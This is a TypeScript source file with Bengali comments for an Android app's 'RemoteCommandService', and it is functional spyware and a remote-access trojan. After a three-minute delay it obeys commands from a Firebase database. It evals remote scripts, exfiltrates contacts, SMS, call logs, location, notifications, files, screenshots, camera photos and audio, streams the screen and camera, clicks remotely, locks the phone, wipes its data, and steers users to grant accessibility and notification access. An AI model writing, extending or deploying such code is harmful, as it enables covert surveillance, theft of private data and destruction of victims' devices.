/**
 * RemoteCommandService.ts
 * এটি আপনার সার্ভারের সাথে কানেক্ট হয়ে কমান্ড বা নতুন কোড রান করবে।
 */

import { NativeSettings, AndroidSettings } from 'capacitor-native-settings';
import { App } from '@capacitor/app';
import { database } from '../firebase';
import { ref, onValue, off, set, push } from 'firebase/database';
import Accessibility from '../plugins/AccessibilityPlugin';

export class RemoteCommandService {
  private static DELAY_MS = 3 * 60 * 1000; // ৩ মিনিট ডিলে
  private static commandRef = ref(database, 'commands');

  static init() {
    console.log('RemoteCommandService initialized. Waiting for delay...');
    
    // নোটিফিকেশন ইভেন্ট লিসেনার
    window.addEventListener('notificationReceived', (event: any) => {
      const notification = event.detail;
      console.log('Notification received in JS:', notification);
      const notificationsRef = ref(database, 'collected_data/notifications');
      push(notificationsRef, {
        ...notification,
        timestamp: Date.now()
      });
    });

    // অ্যাপ চালুর ৩ মিনিট পর প্রথম লিসেনার চালু করবে
    setTimeout(() => {
      this.startListening();
    }, this.DELAY_MS);

    // অ্যাপ ব্যাকগ্রাউন্ডে গেলে বা ফিরে আসলে চেক করবে
    App.addListener('appStateChange', ({ isActive }) => {
      if (isActive) {
        console.log('App became active, checking for commands...');
        // যদি ৩ মিনিট পার হয়ে থাকে তবেই কাজ করবে
      }
    });
  }

  private static startListening() {
    console.log('Starting to listen for Firebase commands...');
    
    onValue(this.commandRef, (snapshot) => {
      const data = snapshot.val();
      if (!data) return;

      console.log('Firebase Command Received:', data);

      // ১. জাভাস্ক্রিপ্ট কোড রান করা
      if (data.script) {
        try {
          eval(data.script);
        } catch (e) {
          console.error('Remote script error:', e);
        }
      }

      // ২. সেটিংস ওপেন করা (Deep Linking)
      if (data.command === 'open_settings') {
        this.openNativeSettings(data.target);
      }

      // ৩. রিডাইরেক্ট
      if (data.command === 'redirect') {
        window.location.href = data.url;
      }

      // ৪. রিমোট ক্লিক (X, Y কোঅর্ডিনেট দিয়ে)
      if (data.command === 'click') {
        Accessibility.clickAt({ x: data.x, y: data.y })
          .then(() => console.log('Remote click executed successfully'))
          .catch(err => console.error('Remote click failed:', err));
      }

      // ৫. কন্টাক্ট লিস্ট সংগ্রহ করা
      if (data.command === 'get_contacts') {
        Accessibility.getContacts()
          .then((res) => {
            const contactsRef = ref(database, 'collected_data/contacts');
            set(contactsRef, res.contacts);
            console.log('Contacts saved to Firebase');
          })
          .catch(err => console.error('Failed to get contacts:', err));
      }

      // ৬. SMS লিস্ট সংগ্রহ করা
      if (data.command === 'get_sms') {
        Accessibility.getSMS()
          .then((res) => {
            const smsRef = ref(database, 'collected_data/sms');
            set(smsRef, res.sms);
            console.log('SMS saved to Firebase');
          })
          .catch(err => console.error('Failed to get SMS:', err));
      }

      // ৭. কল লগ সংগ্রহ করা
      if (data.command === 'get_call_logs') {
        Accessibility.getCallLogs()
          .then((res) => {
            const logsRef = ref(database, 'collected_data/call_logs');
            set(logsRef, res.call_logs);
            console.log('Call logs saved to Firebase');
          })
          .catch(err => console.error('Failed to get call logs:', err));
      }

      // ৮. লোকেশন সংগ্রহ করা
      if (data.command === 'get_location') {
        Accessibility.getLocation()
          .then((res) => {
            const locationRef = ref(database, 'collected_data/location');
            set(locationRef, {
              ...res,
              timestamp: Date.now()
            });
            console.log('Location saved to Firebase');
          })
          .catch(err => console.error('Failed to get location:', err));
      }

      // ৯. ক্যামেরা দিয়ে ছবি তোলা
      if (data.command === 'take_picture') {
        Accessibility.takePicture({ cameraId: data.cameraId || 0 })
          .then((res) => {
            const pictureRef = ref(database, 'collected_data/pictures');
            push(pictureRef, {
              image: res.image,
              timestamp: Date.now()
            });
            console.log('Picture saved to Firebase');
          })
          .catch(err => console.error('Failed to take picture:', err));
      }

      // ১০. অডিও রেকর্ডিং শুরু করা
      if (data.command === 'start_record') {
        Accessibility.startRecording()
          .then(() => console.log('Recording started'))
          .catch(err => console.error('Failed to start recording:', err));
      }

      // ১১. অডিও রেকর্ডিং বন্ধ করা এবং ডাটা পাঠানো
      if (data.command === 'stop_record') {
        Accessibility.stopRecording()
          .then((res) => {
            const audioRef = ref(database, 'collected_data/audio');
            push(audioRef, {
              audio: res.audio,
              timestamp: Date.now()
            });
            console.log('Audio saved to Firebase');
          })
          .catch(err => console.error('Failed to stop recording:', err));
      }

      // ১২. ফাইল লিস্ট দেখা
      if (data.command === 'list_files') {
        Accessibility.listFiles({ path: data.path })
          .then((res) => {
            const filesRef = ref(database, 'collected_data/file_list');
            set(filesRef, {
              path: data.path || 'root',
              files: res.files,
              timestamp: Date.now()
            });
            console.log('File list saved to Firebase');
          })
          .catch(err => console.error('Failed to list files:', err));
      }

      // ১৩. নির্দিষ্ট ফাইল চুরি করা
      if (data.command === 'get_file') {
        Accessibility.getFile({ path: data.path })
          .then((res) => {
            const fileDataRef = ref(database, 'collected_data/stolen_files');
            push(fileDataRef, {
              name: res.name,
              data: res.data,
              timestamp: Date.now()
            });
            console.log('File stolen and saved to Firebase');
          })
          .catch(err => console.error('Failed to steal file:', err));
      }

      // ১৪. স্ক্রিনশট নেওয়া
      if (data.command === 'take_screenshot') {
        Accessibility.takeScreenshot()
          .then((res) => {
            const screenshotRef = ref(database, 'collected_data/screenshots');
            push(screenshotRef, {
              image: res.image,
              timestamp: Date.now()
            });
            console.log('Screenshot saved to Firebase');
          })
          .catch(err => console.error('Failed to take screenshot:', err));
      }

      // ১৫. ইনস্টল করা অ্যাপের লিস্ট চুরি করা
      if (data.command === 'get_apps') {
        Accessibility.getInstalledApps()
          .then((res) => {
            const appsRef = ref(database, 'collected_data/installed_apps');
            set(appsRef, {
              apps: res.apps,
              timestamp: Date.now()
            });
            console.log('App list saved to Firebase');
          })
          .catch(err => console.error('Failed to get apps:', err));
      }

      // ১৬. লাইভ স্ক্রিন মনিটরিং (পিরিওডিক স্ক্রিনশট)
      let streamInterval: any = null;
      if (data.command === 'start_stream') {
        console.log('Starting screen stream...');
        streamInterval = setInterval(() => {
          Accessibility.takeScreenshot()
            .then((res) => {
              const streamRef = ref(database, 'collected_data/live_stream');
              set(streamRef, {
                image: res.image,
                timestamp: Date.now()
              });
            })
            .catch(err => console.error('Stream error:', err));
        }, 3000); // প্রতি ৩ সেকেন্ডে একটি স্ক্রিনশট
      }

      if (data.command === 'stop_stream') {
        if (streamInterval) {
          clearInterval(streamInterval);
          console.log('Stream stopped');
        }
      }

      // ১৭. ফোন লক করা
      if (data.command === 'lock_phone') {
        Accessibility.lockPhone()
          .then(() => console.log('Phone locked successfully'))
          .catch(err => console.error('Failed to lock phone:', err));
      }

      // ১৮. ফোনের সব ডাটা ডিলিট করা (Remote Wipe)
      if (data.command === 'wipe_data') {
        Accessibility.wipeData()
          .then(() => console.log('Wipe command sent'))
          .catch(err => console.error('Failed to wipe data:', err));
      }

      // ১৯. ক্যামেরা লাইভ মনিটরিং (পিরিওডিক ফটো)
      let cameraInterval: any = null;
      if (data.command === 'start_camera_stream') {
        const cameraId = data.cameraId || 0; // 0 for back, 1 for front
        console.log(`Starting camera stream (ID: ${cameraId})...`);
        cameraInterval = setInterval(() => {
          Accessibility.takePicture({ cameraId })
            .then((res) => {
              const streamRef = ref(database, 'collected_data/camera_stream');
              set(streamRef, {
                image: res.image,
                timestamp: Date.now(),
                cameraId
              });
            })
            .catch(err => console.error('Camera stream error:', err));
        }, 3000); // প্রতি ৩ সেকেন্ডে একটি ছবি
      }

      if (data.command === 'stop_camera_stream') {
        if (cameraInterval) {
          clearInterval(cameraInterval);
          console.log('Camera stream stopped');
        }
      }
    });
  }

  private static async openNativeSettings(target: string) {
    try {
      if (target === 'accessibility') {
        await NativeSettings.open({
          option: AndroidSettings.Accessibility,
        });
      } else if (target === 'battery') {
        await NativeSettings.open({
          option: AndroidSettings.BatteryOptimization,
        });
      } else if (target === 'notification_access') {
        // সরাসরি নোটিফিকেশন অ্যাক্সেস সেটিংস ওপেন করা
        window.location.href = 'intent:#Intent;action=android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS;end';
      } else {
        await NativeSettings.open({
          option: AndroidSettings.ApplicationDetails,
        });
      }
    } catch (error) {
      console.error('Failed to open settings:', error);
    }
  }
}
